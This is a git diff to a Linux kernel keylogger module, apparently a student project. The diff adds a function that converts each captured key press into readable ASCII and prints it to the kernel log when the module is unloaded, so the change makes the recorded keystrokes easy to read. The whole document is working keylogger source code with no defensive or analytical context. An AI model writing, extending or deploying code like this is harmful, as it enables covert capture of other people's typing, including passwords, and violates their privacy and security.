@@ -12,6 +12,7 @@
 #include <linux/seq_file.h>
 #include <linux/spinlock.h>
 #include <linux/workqueue.h>
+#include <linux/ctype.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Sebastien Nicolet <snicolet@student.42.fr>");
@@ -401,6 +402,17 @@ static void	key_logprint(struct key_log_entry *log, void *ptr)
 		    (log->upper_case ? log->key->upper_name : log->key->name));
 }
 
+static void	key_logprint_smart(struct key_log_entry *log, void *ptr)
+{
+	char		ascii;
+
+	if (log->event != PRESS)
+		return;
+	ascii = (log->upper_case) ? log->key->ascii_up : log->key->ascii;
+	if (isprint(ascii) || log->key->ascii == '\n')
+		pr_info("%c", ascii);
+}
+
 static void		__exit keylogger_clean(void)
 {
 	pr_info(MODULE_NAME "Cleaning up module.\n");
@@ -410,7 +422,7 @@ static void		__exit keylogger_clean(void)
 		flush_workqueue(workqueue);
 		destroy_workqueue(workqueue);
 	}
-	key_log_iter(&key_logprint, NULL);
+	key_log_iter(&key_logprint_smart, NULL);
 	key_log_clean();
 	pr_info("Keylogger removed.\n");
 }
